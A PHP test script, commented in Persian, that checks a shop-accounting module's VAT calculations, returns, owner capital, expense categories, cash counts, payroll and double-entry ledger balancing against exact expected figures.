<?php
/**
 * ⛔ لایه‌ی حسابداریِ فروشگاه (migration_biz_accounting) — نُه شکافی که
 *    بازبینی با چشمِ حسابدار پیدا کرد (مهر ۱۴۰۵):
 *    ۱ مالیات بر ارزش افزوده، ۲ سامانه‌ی مودیان، ۳ دفترِ دوطرفه، ۴ آورده و
 *    برداشتِ مالک، ۵ سرفصلِ هزینه، ۶ بستنِ سالِ مالی، ۷ سرگذشتِ سند،
 *    ۸ شمارشِ صندوق، ۹ حقوق و مساعده.
 *
 * هر بخش با عددِ دقیق سنجیده می‌شود، نه «خطا نداد». و آخرِ کار همه‌ی سندهای
 * همین تست از دفترِ مشتق می‌گذرند: هر سند تراز، ترازِ آزمایشی تراز،
 * ترازنامه تراز، و مانده‌ی هر صندوق و طرف‌حساب در دفتر **دقیقاً** همان عددِ
 * صفحه‌های فروشگاه.
 */

if (PHP_SAPI !== 'cli') {
    http_response_code(404);
    exit('Not found.');
}

require_once __DIR__ . '/lib/assert.php';
require_once __DIR__ . '/../includes/db.php';
require_once __DIR__ . '/../includes/functions.php';
require_once __DIR__ . '/../includes/auth.php';
require_once __DIR__ . '/../includes/signup.php';
require_once __DIR__ . '/../includes/user_data.php';
require_once __DIR__ . '/../includes/biz_catalog.php';
require_once __DIR__ . '/../includes/biz_docs.php';
require_once __DIR__ . '/../includes/biz_acc.php';
require_once __DIR__ . '/../includes/biz_dash.php';
require_once __DIR__ . '/../includes/biz_docview.php';

const APREFIX = '__bacc_';
const APASS   = 'Acc12345';

try {
    $pdo = Database::getConnection();
} catch (Throwable $e) {
    T::blocked('حسابداریِ فروشگاه', 'اتصال به دیتابیس برقرار نشد: ' . $e->getMessage());
    exit(T::report());
}
if (!Biz::available() || !Biz::accReady() || !BizSerial::hasFirstIssued()) {
    T::blocked('حسابداریِ فروشگاه', 'لایه‌ی حسابداری نیست — اول: bash deploy/migrate.sh --apply');
    exit(T::report());
}

$wipe = function () use ($pdo) {
    $ids = $pdo->query("SELECT id FROM users WHERE username LIKE '" . APREFIX . "%'")->fetchAll(PDO::FETCH_COLUMN);
    foreach ($ids as $id) {
        foreach (['biz_doc_log', 'biz_cash_counts', 'biz_year_closes', 'biz_allocations', 'biz_payments', 'biz_stock_moves'] as $t) {
            $pdo->prepare("DELETE FROM `{$t}` WHERE user_id = :u")->execute(['u' => $id]);
        }
        $pdo->prepare('DELETE FROM biz_invoices WHERE user_id = :u AND ref_invoice_id IS NOT NULL')->execute(['u' => $id]);
        foreach (['biz_invoices', 'biz_products', 'biz_categories', 'biz_parties', 'biz_accounts', 'biz_expense_cats', 'biz_settings'] as $t) {
            $pdo->prepare("DELETE FROM `{$t}` WHERE user_id = :u")->execute(['u' => $id]);
        }
        foreach (userDataTables() as $t) {
            try { $pdo->prepare("DELETE FROM `{$t}` WHERE user_id = :u")->execute(['u' => $id]); }
            catch (PDOException $e) { }
        }
        $pdo->prepare('DELETE FROM audit_log WHERE target_user_id = :u')->execute(['u' => $id]);
    }
    $pdo->exec("DELETE FROM users WHERE username LIKE '" . APREFIX . "%'");
};
$wipe();

$make = function (string $name) use ($pdo): int {
    $res = createUserAccount($pdo, 'کاربرِ ' . $name, APREFIX . $name, APREFIX . $name . '@example.com', APASS);
    if (!($res['ok'] ?? false)) { throw new RuntimeException('ساختِ کاربر: ' . ($res['error'] ?? '?')); }
    $st = $pdo->prepare('SELECT id FROM users WHERE username = :u');
    $st->execute(['u' => APREFIX . $name]);
    $id = (int)$st->fetchColumn();
    Biz::setType($id, 'business');
    return $id;
};
$L = fn(string $item, string $qty, string $price, string $disc = ''): array => ['item' => $item, 'qty' => $qty, 'price' => $price, 'disc' => $disc];
$acc = fn(int $u): int => (int)BizCash::list($u)[0]['id'];
$cashBal = function (int $u, int $a): int {
    foreach (BizCash::list($u) as $r) { if ((int)$r['id'] === $a) { return (int)$r['balance']; } }
    return PHP_INT_MIN;
};
$partyBal = fn(int $u, int $p): int => (int)BizParties::get($u, $p, true)['balance'];
$inv = fn(int $u, int $id): array => BizInvoices::get($u, $id);
$doc = function (int $u, string $kind, array $lines, array $head = [], array $pay = ['full' => true]) use ($acc) {
    $r = BizInvoices::saveDraft($u, $kind, ['lines' => $lines] + $head);
    if (!$r['ok']) { return $r['message']; }
    $i = BizInvoices::issue($u, (int)$r['id'], $pay + ['account_id' => $acc($u)]);
    return $i['ok'] ? (int)$r['id'] : $i['message'];
};
$setVat = function (int $u, string $rate): array {
    Biz::forgetSettings($u);
    $r = Biz::saveAccounting($u, ['vat_rate' => $rate]);
    Biz::forgetSettings($u);
    return $r;
};
$logOf = fn(int $u, string $t, int $id): array => array_column(BizLog::forDoc($u, $t, $id), 'action');

$u = $make('a');
$A = $acc($u);
$CUST = (int)BizParties::save($u, ['name' => 'مشتریِ مالیاتی', 'kind' => 'customer'])['id'];
$SUPP = (int)BizParties::save($u, ['name' => 'تأمین‌کننده‌ی مالیاتی', 'kind' => 'supplier'])['id'];
$TAX  = (int)BizProducts::save($u, ['type' => 'goods', 'name' => 'کالای مشمول', 'unit' => 'عدد', 'buy_price' => '1000', 'sell_price' => '2000'])['id'];
$EXM  = (int)BizProducts::save($u, ['type' => 'goods', 'name' => 'کالای معاف', 'unit' => 'عدد', 'buy_price' => '500', 'sell_price' => '800'])['id'];
BizProducts::saveTax($u, $EXM, ['vat_exempt' => '1']);

// =================================================================
T::group('۱ — مالیات بر ارزش افزوده: نرخ، ردیف، جمع');
T::same(0.0, Biz::vatRate($u), 'پیش‌فرضِ فروشگاه خاموش است');
foreach (['31', 'abc', '10.555', '-1'] as $bad) {
    T::ok(!$setVat($u, $bad)['ok'], "نرخِ نامعتبر «{$bad}» رد می‌شود");
}
T::same(0.0, Biz::vatRate($u), 'نرخِ ردشده چیزی ننوشت');
$r = $setVat($u, '۱۰');
T::ok($r['ok'], 'نرخِ ۱۰ (رقمِ فارسی) پذیرفته شد', $r['message']);
T::same(10.0, Biz::vatRate($u), 'نرخِ فروشگاه ۱۰٪');

// خرید با مالیات: بهای انبار بی‌مالیات است
$P1 = $doc($u, 'purchase', [$L('کالای مشمول', '10', '1000'), $L('کالای معاف', '10', '500')], ['party_id' => $SUPP], ['full' => false]);
T::ok(is_int($P1), 'خرید صادر شد', (string)$P1);
$pi = $inv($u, $P1);
T::same(1000, (int)$pi['tax_total'], 'مالیاتِ خرید فقط روی کالای مشمول: ۱۰٪ × ۱۰٬۰۰۰');
T::same(16000, (int)$pi['total'], 'جمعِ خرید = ۱۵٬۰۰۰ + ۱٬۰۰۰ مالیات');
T::same(15000, (int)$pi['subtotal'], 'جمعِ ردیف‌ها بی‌مالیات');
T::same([1000, 0], array_map(fn($l) => (int)$l['tax_amount'], $pi['lines']), 'مالیاتِ هر ردیف (معاف = صفر)');
T::same(1000.0, (float)BizProducts::get($u, $TAX)['avg_cost'], '⛔ بهای تمام‌شده‌ی انبار بی‌مالیات است (مالیاتِ خرید اعتبار است، نه بها)');
T::same(-16000, $partyBal($u, $SUPP), 'بدهی به تأمین‌کننده با مالیات');

// فروش: تخفیف و حمل، مالیات روی خالصِ ردیف
$S1 = $doc($u, 'sale', [$L('کالای مشمول', '3', '2000', '600'), $L('کالای معاف', '2', '800')],
           ['party_id' => $CUST, 'discount' => '700', 'extra' => '300'], ['full' => false]);
T::ok(is_int($S1), 'فروش صادر شد', (string)$S1);
$si = $inv($u, $S1);
$nets = array_map(fn($l) => (int)$l['net_total'], $si['lines']);
$net = array_sum($nets);
T::same(5400 + 1600 - 700 + 300, $net, 'خالصِ ردیف‌ها = جمع − تخفیف + حمل');
T::same((int)round($nets[0] * 0.10), (int)$si['lines'][0]['tax_amount'], 'مالیاتِ ردیفِ مشمول روی **خالصِ** آن ردیف (پس از سهمِ تخفیف و حمل)');
T::same(0, (int)$si['lines'][1]['tax_amount'], 'ردیفِ معاف بی‌مالیات');
T::same((int)$si['lines'][0]['tax_amount'], (int)$si['tax_total'], 'جمعِ مالیاتِ سند = جمعِ مالیاتِ ردیف‌ها');
T::same($net + (int)$si['tax_total'], (int)$si['total'], '⛔ مبلغِ سند = خالص + مالیات');
T::same(10.0, (float)$si['vat_rate'], 'نرخِ سند از فروشگاه عکس گرفته شد');
T::same((int)$si['total'], $partyBal($u, $CUST), 'مانده‌ی مشتری با مالیات');
$sales = BizReports::sales($u, BizReports::ALL_FROM, BizReports::ALL_TO);
T::same($net, $sales['net'], '⛔ فروشِ گزارش بی‌مالیات است (مالیات درآمد نیست)');
// همان سری‌ای که نمودارهای داشبورد از آن ساخته می‌شوند
$daily = array_sum(array_column(BizDash::salesDaily($u, date('Y-m-d'), date('Y-m-d')), 'rev'));
T::same($net, $daily, 'نمودارِ روزانه هم بی‌مالیات');

// دریافتِ «کامل» = کلِ مبلغ با مالیات
$S2 = $doc($u, 'sale', [$L('کالای مشمول', '1', '2000')], ['party_id' => $CUST]);
$s2 = $inv($u, $S2);
T::same(2200, (int)$s2['total'], 'فروشِ ۲٬۰۰۰ با ۱۰٪ = ۲٬۲۰۰');
T::same(2200, (int)$s2['paid'], 'دریافتِ کامل همان ۲٬۲۰۰ را تسویه کرد');

// ⛔ گردِ ریاضی (نه کف): ۱٬۰۰۵ × ۱۰٪ = ۱۰۰٫۵ ← ۱۰۱
T::same(101, BizInvoices::lineTax(1005, 10.0), 'گردِ مالیات: نیم به بالا');
$dr = BizInvoices::saveDraft($u, 'sale', ['lines' => [$L('کالای مشمول', '1', '1005')]]);
T::same(101, (int)$inv($u, (int)$dr['id'])['tax_total'], 'مالیاتِ سندِ ۱٬۰۰۵ تومانی ۱۰۱ است');
BizInvoices::deleteDraft($u, (int)$dr['id']);

// نرخِ دستیِ سند و نرخِ پیش‌نویس
$d = BizInvoices::saveDraft($u, 'sale', ['lines' => [$L('کالای مشمول', '1', '1000')], 'vat_rate' => '0']);
T::same(0, (int)$inv($u, (int)$d['id'])['tax_total'], 'نرخِ «۰» روی خودِ سند = بی‌مالیات');
$d2 = BizInvoices::saveDraft($u, 'sale', ['lines' => [$L('کالای مشمول', '1', '1000')]]);
$setVat($u, '9');
BizInvoices::saveDraft($u, 'sale', ['lines' => [$L('کالای مشمول', '1', '1000')]], (int)$d2['id']);
T::same(100, (int)$inv($u, (int)$d2['id'])['tax_total'], '⛔ پیش‌نویسِ موجود با عوض شدنِ نرخِ فروشگاه عوض نمی‌شود (نرخِ خودش ۱۰٪)');
T::ok(!BizInvoices::saveDraft($u, 'sale', ['lines' => [$L('کالای مشمول', '1', '1000')], 'vat_rate' => '40'])['ok'], 'نرخِ سندِ بیش از سقف رد می‌شود');
BizInvoices::deleteDraft($u, (int)$d['id']);
BizInvoices::deleteDraft($u, (int)$d2['id']);
$setVat($u, '10');

// =================================================================
T::group('۱ب — برگشت با مالیاتِ متناسب');
$S3 = $doc($u, 'sale', [$L('کالای مشمول', '3', '1002')], ['party_id' => $CUST], ['full' => false]);
$o3 = $inv($u, $S3);
$lineId = (int)$o3['lines'][0]['id'];
$origTax = (int)$o3['tax_total'];
$before = $partyBal($u, $CUST);
$r1 = BizInvoices::createReturn($u, $S3, [$lineId => '1']);
T::ok($r1['ok'], 'برگشتِ ۱ از ۳', $r1['message']);
$ret1 = $inv($u, (int)$r1['id']);
T::same((int)round($origTax / 3), (int)$ret1['tax_total'], 'مالیاتِ برگشت = سهمِ همان مقدار از مالیاتِ ردیفِ اصلی');
T::same(array_sum(array_map(fn($l) => (int)$l['net_total'], $ret1['lines'])) + (int)$ret1['tax_total'], (int)$ret1['total'], 'مبلغِ برگشت = خالص + مالیات');
T::same($before - (int)$ret1['total'], $partyBal($u, $CUST), 'مانده‌ی مشتری به اندازه‌ی کلِ برگشت (با مالیات) کم شد');
T::same(301, $origTax, 'مالیاتِ ۳ × ۱٬۰۰۲ = ۳۰۰٫۶ ← ۳۰۱');
$r2 = BizInvoices::createReturn($u, $S3, [$lineId => '1']);
$ret2 = $inv($u, (int)$r2['id']);
$r2b = BizInvoices::createReturn($u, $S3, [$lineId => '1']);
$ret2b = $inv($u, (int)$r2b['id']);
// گردِ تجمعی: round(۱×۳۰۱/۳)=۱۰۰، round(۲×۳۰۱/۳)=۲۰۱ ⇒ ۱۰۱، و آخری باقیمانده‌ی دقیق ۱۰۰ — جمع ۳۰۱
T::same([100, 101, 100], [(int)$ret1['tax_total'], (int)$ret2['tax_total'], (int)$ret2b['tax_total']], '⛔ برگشت‌ها با گردِ تجمعی؛ جمعشان دقیقاً مالیاتِ اصل (۳۰۱)');
T::same((int)$o3['total'], (int)$ret1['total'] + (int)$ret2['total'] + (int)$ret2b['total'], 'جمعِ برگشت‌ها = کلِ فاکتور');
T::same(10.0, (float)$ret2['vat_rate'], 'برگشت نرخِ سندِ اصلی را دارد');

// =================================================================
T::group('۱ج — گزارشِ مالیات بر ارزش افزوده');
$vr = BizVat::report($u, BizReports::ALL_FROM, BizReports::ALL_TO);
$expSaleTax = (int)$si['tax_total'] + (int)$s2['tax_total'] + (int)$o3['tax_total'] - (int)$ret1['tax_total'] - (int)$ret2['tax_total'] - (int)$ret2b['tax_total'];
T::same($expSaleTax, $vr['sum']['sale_tax'], 'مالیاتِ فروش = فروش − برگشت از فروش');
T::same(1000, $vr['sum']['buy_tax'], 'مالیاتِ خرید (اعتبار)');
T::same($expSaleTax - 1000, $vr['sum']['payable'], '⛔ بدهی به سازمان = مالیاتِ فروش − مالیاتِ خرید');
// ⛔ «معاف» از ردیف‌ها: فاکتورِ ۱ مختلط است (مشمول + معاف) و هیچ فاکتورِ تمام‌معافی نیست
T::same((int)$si['lines'][1]['net_total'], $vr['sum']['exempt'], '⛔ ردیفِ معافِ فاکتورِ مختلط در «فروشِ معاف» شمرده می‌شود');
T::same($sales['net'] + (2000) + 0, $vr['sum']['sale_net'], 'فروشِ بی‌مالیاتِ گزارش (فاکتورِ ۳ کاملاً برگشت خورد)');
[$qf, $qt] = BizVat::quarter(1405, 3);
T::same(['2026-09-23', '2026-12-21'], [$qf, $qt], 'فصلِ سومِ ۱۴۰۵ = مهر تا آذر');
T::same(['2025-03-21', '2026-03-20'], BizVat::year(1404), 'سالِ ۱۴۰۴');

// =================================================================
T::group('۴ — آورده و برداشتِ مالک: پول جابه‌جا می‌شود، سود نه');
$profitBefore = BizReports::cash($u, BizReports::ALL_FROM, BizReports::ALL_TO);
$c0 = $cashBal($u, $A);
$r = BizPay::create($u, ['kind' => 'capital', 'amount' => '50000', 'account_id' => $A]);
T::ok($r['ok'], 'آورده ثبت شد', $r['message']);
$CAP = (int)$r['id'];
T::same($c0 + 50000, $cashBal($u, $A), 'آورده به صندوق آمد');
$r = BizPay::create($u, ['kind' => 'drawing', 'amount' => '8000', 'account_id' => $A]);
T::ok($r['ok'], 'برداشت ثبت شد', $r['message']);
T::same($c0 + 42000, $cashBal($u, $A), 'برداشت از صندوق رفت');
$cashAfter = BizReports::cash($u, BizReports::ALL_FROM, BizReports::ALL_TO);
T::same([$profitBefore['income'], $profitBefore['expense']], [$cashAfter['income'], $cashAfter['expense']], '⛔ آورده درآمد نیست و برداشت هزینه نیست');
T::same([50000, 8000], [$cashAfter['capital'], $cashAfter['drawing']], 'جمعِ آورده و برداشت جدا');
T::same('آورده‌ی مالک', (string)BizPay::get($u, $CAP)['title'], 'شرحِ خالی = نامِ نوع');
$st = BizReports::accountStatement($u, $A, BizReports::ALL_FROM, BizReports::ALL_TO);
T::same($cashBal($u, $A), $st['closing'], 'گردشِ صندوق با آورده/برداشت همان موجودی است');
$lst = BizPay::list($u, 'capital');
T::same([1, 50000], [$lst['total'], $lst['in']], 'صافیِ «آورده‌ی مالک» و جمعِ ورودش');

// =================================================================
T::group('۵ — سرفصلِ هزینه و درآمد');
$cats = BizExpCats::list($u);
T::ok(count($cats) === count(BizExpCats::DEFAULTS['expense']) + count(BizExpCats::DEFAULTS['income']), 'سرفصل‌های پیش‌فرض ساخته شدند', (string)count($cats));
$sys = array_values(array_filter(array_column($cats, 'sys_key')));
sort($sys);
T::same(['cash_over', 'cash_short', 'salary'], $sys, 'سه سرفصلِ سیستمی');
T::same(count($cats), count(BizExpCats::list($u)), 'بارِ دوم پیش‌فرضِ تکراری ساخته نمی‌شود');
$billId = (int)array_values(array_filter($cats, fn($c) => $c['name'] === 'قبوض و شارژ'))[0]['id'];
T::ok(BizExpCats::save($u, 'expense', 'قبض‌ها', $billId)['ok'], 'نامِ سرفصلِ پیش‌فرض عوض شد');
T::same(count($cats), count(BizExpCats::list($u)), '⛔ پیش‌فرضِ تغییرنام‌داده دوباره ساخته نمی‌شود');
$RENT = 0; $BANK = 0;
foreach ($cats as $c) { if ($c['name'] === 'اجاره') { $RENT = (int)$c['id']; } if ($c['name'] === 'سودِ بانکی') { $BANK = (int)$c['id']; } }
$r = BizPay::create($u, ['kind' => 'expense', 'amount' => '3000', 'account_id' => $A, 'category_id' => $RENT]);
T::ok($r['ok'], 'هزینه با سرفصل و بی‌شرح', $r['message']);
$e1 = BizPay::get($u, (int)$r['id']);
T::same([$RENT, 'اجاره'], [(int)$e1['category_id'], (string)$e1['title']], 'سرفصل نشست و شرحِ خالی = نامِ سرفصل');
BizPay::create($u, ['kind' => 'expense', 'amount' => '1500', 'account_id' => $A, 'category_id' => $RENT, 'title' => 'اجاره‌ی انبار']);
BizPay::create($u, ['kind' => 'expense', 'amount' => '700', 'account_id' => $A, 'title' => 'قدیمی بی‌سرفصل']);
T::ok(!BizPay::create($u, ['kind' => 'expense', 'amount' => '100', 'account_id' => $A, 'category_id' => $BANK])['ok'], '⛔ سرفصلِ درآمد روی هزینه رد می‌شود');
$v = $make('v');
$vCat = (int)BizExpCats::list($v, 'expense')[0]['id'];
T::ok(!BizPay::create($u, ['kind' => 'expense', 'amount' => '100', 'account_id' => $A, 'category_id' => $vCat])['ok'], '⛔ سرفصلِ فروشگاهِ دیگر رد می‌شود');
T::ok(!BizPay::create($u, ['kind' => 'expense', 'amount' => '100', 'account_id' => $A])['ok'], 'هزینه‌ی بی‌سرفصل و بی‌شرح رد می‌شود');
$ex = [];
foreach (BizReports::expenses($u, BizReports::ALL_FROM, BizReports::ALL_TO, 20) as $row) { $ex[$row['title']] = (int)$row['s']; }
T::same(4500, $ex['اجاره'] ?? null, '⛔ گزارشِ هزینه به تفکیکِ سرفصل (دو شرحِ مختلف، یک سرفصل)');
T::same(700, $ex['قدیمی بی‌سرفصل'] ?? null, 'هزینه‌ی بی‌سرفصل با شرحِ خودش');
$salaryId = BizExpCats::sysId($pdo, $u, 'salary');
T::ok(!BizExpCats::setActive($u, $salaryId, false)['ok'], 'سرفصلِ سیستمی غیرفعال نمی‌شود');
T::ok(BizExpCats::setActive($u, $RENT, false)['ok'], 'سرفصلِ عادی غیرفعال می‌شود');
T::ok(!BizPay::create($u, ['kind' => 'expense', 'amount' => '100', 'account_id' => $A, 'category_id' => $RENT])['ok'], 'سرفصلِ غیرفعال پذیرفته نمی‌شود');
BizExpCats::setActive($u, $RENT, true);
T::ok(!BizExpCats::save($u, 'expense', 'اجاره')['ok'], 'نامِ تکراری رد می‌شود');
T::ok(BizExpCats::save($u, 'expense', 'بیمه')['ok'], 'سرفصلِ تازه');

// =================================================================
T::group('۸ — شمارشِ صندوق');
$bal = $cashBal($u, $A);
$r = BizCashCount::record($u, $A, (string)($bal - 300), date('Y-m-d'), 'پایانِ روز');
T::ok($r['ok'] && $r['diff'] === -300, 'کسریِ ۳۰۰', $r['message']);
T::same($bal - 300, $cashBal($u, $A), '⛔ موجودیِ دفتر حالا همان پولِ شمرده‌شده است');
$short = BizCashCount::history($u)[0];
$sp = BizPay::get($u, (int)$short['payment_id']);
T::same(['expense', 300, BizExpCats::sysId($pdo, $u, 'cash_short')], [$sp['kind'], (int)$sp['amount'], (int)$sp['category_id']], 'کسری = هزینه زیرِ «کسریِ صندوق»');
$r = BizCashCount::record($u, $A, (string)($bal - 300 + 120), date('Y-m-d'));
T::ok($r['ok'] && $r['diff'] === 120, 'اضافه‌ی ۱۲۰', $r['message']);
$over = BizPay::get($u, (int)BizCashCount::history($u)[0]['payment_id']);
T::same(['income', 120], [$over['kind'], (int)$over['amount']], 'اضافه = درآمد زیرِ «اضافه‌ی صندوق»');
$r = BizCashCount::record($u, $A, (string)$cashBal($u, $A), date('Y-m-d'));
T::ok($r['ok'] && $r['diff'] === 0 && BizCashCount::history($u)[0]['payment_id'] === null, 'برابر: شمارش ثبت شد، سندی نه');
T::ok(!BizCashCount::record($u, $A, '-5', date('Y-m-d'))['ok'], 'مبلغِ منفی رد می‌شود');
T::ok(!BizCashCount::record($u, $A, '', date('Y-m-d'))['ok'], 'مبلغِ خالی رد می‌شود');
T::ok(!BizCashCount::record($u, $A, '100', date('Y-m-d', strtotime('+2 day')))['ok'], 'روزِ آینده رد می‌شود');
$chq = BizCash::chequeAccount($pdo, $u, 'in');
T::ok(!BizCashCount::record($u, $chq, '0', date('Y-m-d'))['ok'], 'صندوقِ چک شمرده نمی‌شود');
T::ok(!BizCashCount::record($v, $A, '0', date('Y-m-d'))['ok'], '⛔ صندوقِ فروشگاهِ دیگر شمرده نمی‌شود');
$yest = date('Y-m-d', strtotime('-1 day'));
T::same(BizCashCount::balanceAt($pdo, $u, $A, $yest), BizCashCount::balanceAt($pdo, $u, $A, $yest), 'مانده‌ی تا یک روز');
T::ok(BizCashCount::balanceAt($pdo, $u, $A, date('Y-m-d')) === $cashBal($u, $A), 'مانده‌ی تا امروز = موجودیِ صندوق');

// =================================================================
T::group('۹ — حقوق و مساعده');
$EMP = (int)BizParties::save($u, ['name' => 'کارمندِ آزمون', 'kind' => 'employee'])['id'];
T::same('employee', (string)BizParties::get($u, $EMP)['kind'], 'طرف‌حسابِ نوعِ کارمند');
$c1 = $cashBal($u, $A);
$r = BizPayroll::advance($u, $EMP, '500', $A, date('Y-m-d'));
T::ok($r['ok'], 'مساعده', $r['message']);
T::same(500, $partyBal($u, $EMP), 'کارمند به اندازه‌ی مساعده بدهکار شد');
T::ok(!BizPayroll::advance($u, $CUST, '500', $A, date('Y-m-d'))['ok'], 'مساعده فقط به کارمند');
$exp0 = BizReports::cash($u, BizReports::ALL_FROM, BizReports::ALL_TO)['expense'];
$r = BizPayroll::paySalary($u, $EMP, '2000', '600', $A, date('Y-m-d'));
T::ok(!$r['ok'], '⛔ کسرِ بیش از مساعده‌ی باز رد می‌شود', $r['message']);
T::ok(!BizPayroll::paySalary($u, $EMP, '400', '450', $A, date('Y-m-d'))['ok'], 'کسرِ بیش از حقوق رد می‌شود');
$r = BizPayroll::paySalary($u, $EMP, '2000', '500', $A, date('Y-m-d'));
T::ok($r['ok'], 'حقوق با کسرِ مساعده', $r['message']);
T::same(0, $partyBal($u, $EMP), '⛔ مساعده تسویه شد');
T::same($c1 - 500 - 1500, $cashBal($u, $A), 'از صندوق فقط مساعده و خالصِ حقوق رفت');
T::same($exp0 + 2000, BizReports::cash($u, BizReports::ALL_FROM, BizReports::ALL_TO)['expense'], '⛔ هزینه‌ی سود = **کلِ** حقوق');
$h = BizPayroll::history($u);
T::same(['receipt', 'expense', 'payment'], array_column($h, 'kind'), 'گردشِ کارمند: مساعده، حقوق، کسر');
$salExp = array_values(array_filter($h, fn($x) => $x['kind'] === 'expense'))[0];
T::same([$salaryId, $EMP], [(int)BizPay::get($u, (int)$salExp['id'])['category_id'], (int)BizPay::get($u, (int)$salExp['id'])['party_id']], 'هزینه‌ی حقوق: سرفصلِ «حقوق و دستمزد» و پیوند به کارمند');
T::same(1, count(BizPayroll::employees($u)), 'فهرستِ کارکنان');
$r = BizPay::create($u, ['kind' => 'expense', 'amount' => '100', 'account_id' => $A, 'title' => 'آزمون', 'party_id' => $CUST]);
T::same(null, BizPay::get($u, (int)$r['id'])['party_id'], 'هزینه فقط به **کارمند** پیوند می‌خورد، نه مشتری');

// =================================================================
T::group('۷ — سرگذشتِ سند');
T::same(['issue'], $logOf($u, 'invoice', $S1), 'صدورِ فاکتور ثبت شد');
$r = BizInvoices::unissue($u, $S2);
T::ok($r['ok'], 'برگشت به پیش‌نویس', $r['message']);
$log = BizLog::forDoc($u, 'invoice', $S2);
T::same(['issue', 'unissue'], array_column($log, 'action'), 'برگشت به پیش‌نویس ثبت شد');
T::same(2200, $log[1]['snapshot']['total'] ?? null, '⛔ عکسِ پیش از برگشت: مبلغِ همان فاکتوری که دستِ مشتری است');
T::same(1, count($log[1]['snapshot']['lines'] ?? []), 'عکس ردیف‌ها را هم دارد');
$voidedPay = $pdo->prepare("SELECT id FROM biz_payments WHERE invoice_id = :i AND user_id = :u AND origin_invoice = 1");
$voidedPay->execute(['i' => $S2, 'u' => $u]);
$vp = (int)$voidedPay->fetchColumn();
T::same(['create', 'void'], $logOf($u, 'payment', $vp), 'دریافتِ همراهِ فاکتور: ثبت و ابطال');
$r = BizInvoices::saveDraft($u, 'sale', ['party_id' => $CUST, 'lines' => [$L('کالای مشمول', '1', '1500')]], $S2);
T::ok($r['ok'], 'اصلاحِ قیمت', $r['message']);
$log = BizLog::forDoc($u, 'invoice', $S2);
T::same('edit', end($log)['action'], 'اصلاحِ پیش‌نویسِ **شماره‌دار** ثبت شد');
T::same(2000, (int)(end($log)['snapshot']['lines'][0]['p'] ?? 0), 'با فیِ پیش از اصلاح');
BizInvoices::issue($u, $S2, ['full' => true, 'account_id' => $A]);
T::same(['issue', 'unissue', 'edit', 'issue'], $logOf($u, 'invoice', $S2), 'صدورِ دوباره');
T::same(1650, (int)BizLog::forDoc($u, 'invoice', $S2)[3]['amount'], 'مبلغِ پس از صدورِ دوباره (۱٬۵۰۰ + ۱۰٪)');
$dn = BizInvoices::saveDraft($u, 'sale', ['lines' => [$L('کالای مشمول', '1', '1000')]]);
BizInvoices::saveDraft($u, 'sale', ['lines' => [$L('کالای مشمول', '1', '1100')]], (int)$dn['id']);
T::same([], $logOf($u, 'invoice', (int)$dn['id']), 'پیش‌نویسِ بی‌شماره ردی نمی‌سازد (هنوز سندی نیست)');
BizInvoices::deleteDraft($u, (int)$dn['id']);
$S4 = $doc($u, 'sale', [$L('کالای مشمول', '1', '1000')], ['party_id' => $CUST], ['full' => false]);
$r = BizInvoices::void($u, $S4);
T::ok($r['ok'], 'ابطال', $r['message']);
$log = BizLog::forDoc($u, 'invoice', $S4);
T::same(['issue', 'void'], array_column($log, 'action'), 'ابطال ثبت شد');
T::same('issued', $log[1]['snapshot']['status'] ?? null, 'عکسِ پیش از ابطال');
$r = BizPay::void($u, $CAP);
T::same(['create', 'void'], $logOf($u, 'payment', $CAP), 'ابطالِ دریافت/پرداخت ثبت شد');
BizPay::create($u, ['kind' => 'capital', 'amount' => '50000', 'account_id' => $A]);
$ck = BizPay::create($u, ['kind' => 'receipt', 'party_id' => $CUST, 'amount' => '1000', 'account_id' => $A, 'method' => 'cheque',
                          'cheque_due' => date('Y-m-d', strtotime('+10 day')), 'cheque_no' => '123']);
T::ok($ck['ok'], 'چکِ دریافتی', $ck['message']);
BizCheques::clear($u, (int)$ck['id'], $A);
BizCheques::unclear($u, (int)$ck['id']);
BizCheques::bounce($u, (int)$ck['id']);
T::same(['create', 'cheque_clear', 'cheque_unclear', 'cheque_bounce'], $logOf($u, 'payment', (int)$ck['id']), 'چرخه‌ی چک: وصول، برگشت از وصول، برگشتی');
T::same([], BizLog::forDoc($v, 'invoice', $S1), '⛔ سرگذشتِ سندِ فروشگاهِ دیگر دیده نمی‌شود');

// =================================================================
T::group('۳ — دفترِ دوطرفه: روزنامه، ترازِ آزمایشی، ترازنامه، مغایرت');
// موجودی و مانده‌ی اول دوره، انبارگردانی و خریدِ بی‌انبار هم در دفتر بیایند
$pdo->prepare('UPDATE biz_accounts SET opening_balance = 7000 WHERE id = :a AND user_id = :u')->execute(['a' => $A, 'u' => $u]);
$pdo->prepare('UPDATE biz_parties SET opening_balance = -2500 WHERE id = :p AND user_id = :u')->execute(['p' => $SUPP, 'u' => $u]);
$OPN = (int)BizProducts::save($u, ['type' => 'goods', 'name' => 'کالای اول دوره', 'unit' => 'عدد', 'buy_price' => '300', 'sell_price' => '500', 'opening_qty' => '4'])['id'];
BizStock::adjustTo($u, $OPN, 3, 'شمارش');
$doc($u, 'purchase', [$L('کرایه‌ی حمل', '1', '400')], ['party_id' => $SUPP], ['full' => false]);
$pendChq = BizPay::create($u, ['kind' => 'receipt', 'party_id' => $CUST, 'amount' => '700', 'account_id' => $A, 'method' => 'cheque',
                               'cheque_due' => date('Y-m-d', strtotime('+20 day')), 'cheque_no' => '777']);
T::ok($pendChq['ok'], 'چکِ دریافتیِ در جریان', $pendChq['message']);
$all = BizLedger::entries($u, BizReports::ALL_TO);
T::ok(count($all) > 20, 'سندهای حسابداری ساخته شدند', (string)count($all));
T::ok(BizLedger::balanced($all), '⛔ هر سند تراز است (بدهکار = بستانکار)');
$tb = BizLedger::trial($u, BizReports::ALL_TO, '', $all);
T::same($tb['dr'], $tb['cr'], '⛔ ترازِ آزمایشی تراز است');
$pl = 0;
foreach ($tb['rows'] as $row) { if (in_array($row['type'], ['income', 'expense'], true)) { $pl += $row['cr'] - $row['dr']; } }
$sAll = BizReports::sales($u, BizReports::ALL_FROM, BizReports::ALL_TO);
$cAll = BizReports::cash($u, BizReports::ALL_FROM, BizReports::ALL_TO);
T::same(BizReports::profit($sAll['gross'], $sAll['other'], $cAll['income'], $cAll['expense']), $pl, '⛔ سود و زیانِ دفتر = همان `BizReports::profit()`');
$vrAll = BizVat::report($u, BizReports::ALL_FROM, BizReports::ALL_TO);
T::same(1040, $vrAll['sum']['buy_tax'], 'مالیاتِ خرید با کرایه‌ی حمل (۱٬۰۰۰ + ۴۰)');
T::same($vrAll['sum']['buy_tax'], (int)$tb['rows']['1105']['balance'], 'حسابِ مالیاتِ خرید = گزارشِ مالیات');
